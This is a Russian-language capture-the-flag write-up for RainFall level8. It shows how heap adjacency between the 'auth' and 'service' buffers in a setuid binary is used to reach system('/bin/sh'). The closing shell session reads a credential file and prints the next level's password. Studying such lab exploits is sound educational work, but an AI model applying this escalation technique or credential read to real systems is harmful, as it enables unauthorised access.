Мы можем найти исполняемый файл, ожидающий ввода :

#level8@RainFall:~$ ls -l
#total 8
#-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
#level8@RainFall:~$ ./level8
#(nil), (nil)
#bla
#(nil), (nil)
#test
#(nil), (nil)
#
#(nil), (nil)
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
#(nil), (nil)
#^C
#level8@RainFall:~$

После анализа с помощью gdb мы находим только функцию main(), достаточно длинную..
Хорошо, итак, программа запускает систему ("/bin/sh") после серии условных переходов.
Он также считывает стандартный ввод с помощью fgets() и ожидает команд :

аутентификация: вызывает malloc() и strcpy() и копирует данные после аутентификации в глобальную переменную auth.
служба: вызывает strdup() и копирует данные, следующие за службой, в службу глобальных переменных.
сброс: вызывает функцию free() и освобождает глобальную переменную auth.
вход в систему: вызывает system(), если значение auth[32] отличается от 0, или write() в противном случае. Затем отображаются адреса глобальных переменных auth и service.
Чтобы достичь системной функции, мы должны играть с приведенными выше командами. Давайте запустим программу, чтобы увидеть адреса наших глобальных переменных после каждой команды :

#level8@RainFall:~$ ./level8
#(nil), (nil)
#auth 
#0x804a008, (nil)
#service
#0x804a008, 0x804a018

Создайте два указателя с командами auth и service достаточно длинными, чтобы достичь 32 байт, включая 16 байт отступов между ними :

16 padding bytes + 16 service bytes

#level8@RainFall:~$ ./level8
#(nil), (nil)
#auth 
#0x804a008, (nil)
#service0123456789abcdef
#0x804a008, 0x804a018
#login
#$ whoami
#level9
#$
#$ cat /home/user/level9/.pass
#c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
#$ su level9


